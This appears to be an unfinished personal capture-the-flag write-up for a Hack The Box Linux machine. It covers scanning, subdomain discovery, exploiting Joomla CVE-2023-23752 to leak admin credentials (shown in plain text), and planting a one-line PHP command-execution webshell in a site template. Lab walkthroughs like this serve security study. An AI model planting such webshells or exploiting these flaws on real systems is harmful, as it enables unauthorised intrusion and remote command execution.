{{date}} | {{time}}

Tags: #linux #htb #easy #joomla #CVE-2023-23752 #php-webshell



| IP                   | 10.10.11.242  |
| -------------------- | ------------- |
| Domain / Workgroup   |               |
| Hostname             |               |
| Host OS              | Linux, Ubuntu |
| Host Architecture    |               |
| Open Services        |               |
| Vulnerabilities      |               |
| User Accounts/Creds  |               |
| Admin Accounts/Creds |               |
| User Flag            |               |
| Root Flag            |               |

### Summary



### Lessons Learned



### Notes



### Narrative

Initial port scan.
![](../../_attachments/Pasted%20image%2020240422081903.png)

A more exhaustive TCP port scan was pretty much the same.

![](../../_attachments/Pasted%20image%2020240422081957.png)

Service scan on TCP 22 and TCP 80:

![](../../_attachments/Pasted%20image%2020240422082057.png)

This might be something to keep in mind but doesn't help us yet:

[CVE-2023–38408 (OpenSSH Vulnerability to RCE) | by Manjil | Medium](https://medium.com/@mane_csit2075/cve-2023-38408-openssh-vulnerability-to-rce-9e756a0369fd)

This may also be useful to keep in mind:

[NGINX through 1.18.0 allows an HTTP request smuggling... · CVE-2020-12440 · GitHub Advisory Database · GitHub](https://github.com/advisories/GHSA-6wvc-hc5h-7fqv)

The site isn't real interesting. Neither is a basic directory bust:

![](../../_attachments/Pasted%20image%2020240422111616.png)

A common tactic employed by CTF makers is to leverage virtual hosting. The scan is still running but we have something to check out while it finishes:

![](../../_attachments/Pasted%20image%2020240422122206.png)

Directory busting on this virtually hosted subdomain reveals something interesting:

![](../../_attachments/Pasted%20image%2020240422173524.png)

This leads to a Joomla admin login page. Searching for a possible bypass, led to this blog post identifying a potentially sensitive file exposed to unauthenticated users:

[CVE-2023-23752: Joomla Authentication Bypass Vulnerability (pingsafe.com)](https://www.pingsafe.com/blog/cve-2023-23752-joomla-authentication-bypass-vulnerability/)

![](../../_attachments/Pasted%20image%2020240422174057.png)

/administrator/manifests/files/joomla.xml

The version is 4.2.6. It seems that Joomla 4.2.6 is vulnerable to CVE-2023-23752:

[Joomla! CVE-2023-23752 to Code Execution - Blog - VulnCheck](https://vulncheck.com/blog/joomla-for-rce)

Inspired by this blog post, the following request was made against the API (unauthenticated):

![](../../_attachments/Pasted%20image%2020240422180750.png)

`lewis`
`P4ntherg0t1n5r3c0n##`

Unfortunately, these credentials did not allow SSH access. It did, however, allow access to the admin portal.



The admin portal allows content control, allowing the insertion of the following code into /templates/cassiopeia/index.php:

``` php
<?php if (isset($GET['cmd'])) system($_GET['cmd']); ?>
```





